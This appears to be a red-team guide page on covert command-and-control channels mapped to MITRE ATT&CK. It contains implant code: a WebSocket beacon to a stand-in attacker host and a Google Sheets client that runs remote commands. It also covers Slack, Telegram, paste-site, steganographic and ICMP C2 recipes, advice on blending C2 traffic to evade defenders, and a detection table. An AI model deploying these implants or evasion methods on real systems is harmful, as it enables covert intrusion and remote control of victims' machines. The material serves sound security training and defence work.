# Covert Communication Channels

> **MITRE ATT&CK**: Command and Control > T1071 - Application Layer Protocol
> **Platforms**: Windows, Linux, macOS
> **Required Privileges**: User (internet access to target service)
> **OPSEC Risk**: Varies (legitimate service abuse = Low; custom protocols = Medium-High)

## Strategic Overview

Covert channels exploit the gap between what network defenders monitor and what is actually possible. Traditional C2 detection focuses on known malware signatures, beacon patterns, and suspicious domains. Covert channels sidestep this entirely by embedding C2 communications within services that defenders either cannot inspect or would never think to block -- Google Sheets, Slack, Notion, or even image files on social media. The key insight for a Red Team Lead is that the best covert channel is one that uses a service the target organization already depends on, making it impossible to block without disrupting business operations.

**Channel selection matrix**: What services does the target use daily? Which of those services allow API-based data read/write? Can the communication be made bidirectional? What is the latency tolerance for the engagement?

## Technical Deep-Dive

### Custom Protocols Over Common Ports

```python
# HTTP/443 custom protocol -- looks like HTTPS but carries custom C2
# The simplest covert channel: wrap your protocol in TLS on port 443
# Most firewalls allow outbound 443 without deep inspection

# WebSocket C2 -- persistent connection over HTTP upgrade
# Server (attacker)
import asyncio
import websockets

async def c2_handler(websocket, path):
    async for message in websocket:
        # message = beacon data from implant
        command = input("cmd> ")  # Operator input
        await websocket.send(command)

asyncio.get_event_loop().run_until_complete(
    websockets.serve(c2_handler, "0.0.0.0", 443, ssl=ssl_context))
asyncio.get_event_loop().run_forever()

# Client (implant)
import websockets
async def beacon():
    async with websockets.connect("wss://c2.attacker.com/ws") as ws:
        while True:
            await ws.send(collect_data())
            cmd = await ws.recv()
            result = execute(cmd)
            await ws.send(result)
            await asyncio.sleep(60)
```

### Cloud Service C2 (Google Sheets)

```python
# Google Sheets as C2 -- completely legitimate traffic to google.com
# Attacker posts commands to a cell, implant reads and writes results

import gspread
from google.oauth2.service_account import Credentials

creds = Credentials.from_service_account_file('service_account.json',
    scopes=['https://spreadsheets.google.com/feeds'])
gc = gspread.authorize(creds)
sheet = gc.open_by_key('SPREADSHEET_ID').sheet1

# Implant: check for commands
def check_commands():
    cmd = sheet.cell(1, 1).value    # Read command from A1
    if cmd:
        result = os.popen(cmd).read()
        sheet.update_cell(1, 2, result)  # Write result to B1
        sheet.update_cell(1, 1, '')      # Clear command
    time.sleep(300)  # Check every 5 minutes

# Operator: post commands
sheet.update_cell(1, 1, 'whoami')
time.sleep(60)
print(sheet.cell(1, 2).value)     # Read result

# Traffic: HTTPS to sheets.googleapis.com -- indistinguishable from normal Sheets usage
```

### Cloud Function / Messaging Platform C2

```python
# AWS Lambda as C2 relay -- traffic goes to amazonaws.com
# Lambda stores beacon data in S3, returns pending commands
# Implant connects to: https://RANDOM.execute-api.us-east-1.amazonaws.com/prod/beacon
# All traffic goes to AWS-owned IPs on port 443 -- indistinguishable from legitimate usage

# Slack C2 -- uses Slack API for bidirectional command and control
# Implant posts results via chat.postMessage, reads commands from conversations.history
# Traffic: HTTPS to slack.com -- if target org uses Slack, this is invisible

# Telegram Bot C2 -- uses Bot API for send/receive
# send_result() -> api.telegram.org/bot{TOKEN}/sendMessage
# get_command()  -> api.telegram.org/bot{TOKEN}/getUpdates
# May be blocked in corporate environments unlike Slack/Teams
```

### Social Media C2

```
# Discord webhook: POST to discord.com/api/webhooks/ID/TOKEN with beacon data
# Reddit: Post commands as comments on obscure subreddits, implant checks for new comments
# Twitter/X: DMs to bot account (less practical now due to API cost)
# All traffic is HTTPS to social media domains -- hard to distinguish from normal usage
```

### Dead Drop C2 (Paste Services)

```
# Pastebin / paste.ee / GitHub Gists / Notion pages as dead drops
# Operator posts AES-encrypted, base64-encoded command to paste service (unlisted, auto-expire)
# Implant periodically checks known paste URL, decrypts, executes, posts result to new paste
# All traffic is HTTPS to legitimate, high-reputation domains
# Alternatives: GitHub Gists, Trello cards, Google Docs -- all support API-based read/write
```

### Steganographic Channels

```
LSB Steganography workflow:
1. Operator embeds command in image (modify least significant bits of pixel RGB values)
2. Uploads image to Imgur, Twitter, Instagram, or corporate SharePoint
3. Implant downloads image from public URL
4. Extracts hidden command from pixel data using shared algorithm/key
5. Executes and embeds result in a new image, uploads back

Tools: steghide, OpenStego, custom PIL/Pillow scripts
Detection: Nearly impossible without knowing the algorithm and key
```

### ICMP Covert Channel

```
# ICMP echo request/reply with data in payload (scapy or custom)
# pkt = IP(dst=target)/ICMP(type=8)/Raw(load=encoded_data)
# Requires raw socket access (root/admin or CAP_NET_RAW)
# Keep payloads small (< 64 bytes) to mimic normal ping
```

### Traffic Blending Strategies

```
1. Mimic target's existing traffic: Office 365 -> Graph API calls, AWS -> Lambda, Slack -> Slack API
2. Timing: Business hours only, human-like jitter, reduced weekend frequency
3. Volume: Proportional to legitimate traffic, no large bursts
4. Encryption: TLS 1.3 with common cipher suites, matching JA3 fingerprints, trusted CA certs
```

## Detection & Evasion

| Channel Type | Detection Difficulty | Key Indicators | Primary Defense |
|-------------|---------------------|----------------|-----------------|
| Cloud service C2 | Very Hard | Unusual API patterns to legitimate services | CASB, behavioral analysis |
| Messaging platform | Hard | Bot tokens, unusual message patterns | API monitoring, anomaly detection |
| Dead drop (paste sites) | Hard | Periodic requests to paste services | URL filtering, paste site monitoring |
| Steganography | Very Hard | Almost undetectable without the key | Statistical steganalysis (rarely deployed) |
| ICMP tunnel | Medium | Payload size, session duration | ICMP payload inspection, size limits |
| WebSocket | Medium | Long-lived connections, data patterns | DPI, WebSocket content inspection |
| Custom port 443 | Medium-Hard | JA3 mismatch, non-standard TLS behavior | JA3 fingerprinting, TLS inspection |

**The ultimate evasion**: Use a service the target organization already uses as your C2 channel. If the target uses Google Workspace, use Google Sheets. If they use Azure, use Azure Functions. If they use Slack, use Slack bots. Defenders cannot block the service without causing business disruption, and the traffic is indistinguishable from legitimate usage without deep behavioral analysis.

## Cross-References

- [C2 Frameworks](./c2-frameworks.md)
- [C2 Infrastructure](./c2-infrastructure.md)
- [DNS C2](./dns-c2.md)
- [Exfiltration Channels](../10-collection-and-exfiltration/exfiltration-channels.md)

## References

- MITRE ATT&CK T1071: https://attack.mitre.org/techniques/T1071/
- MITRE T1102 (Web Service): https://attack.mitre.org/techniques/T1102/
- MITRE T1001 (Data Obfuscation): https://attack.mitre.org/techniques/T1001/
- C3 (Custom Command and Control): https://github.com/FSecureLABS/C3
- Slack C2: https://github.com/praetorian-inc/slack-c2
- gcat (Gmail C2): https://github.com/byt3bl33d3r/gcat
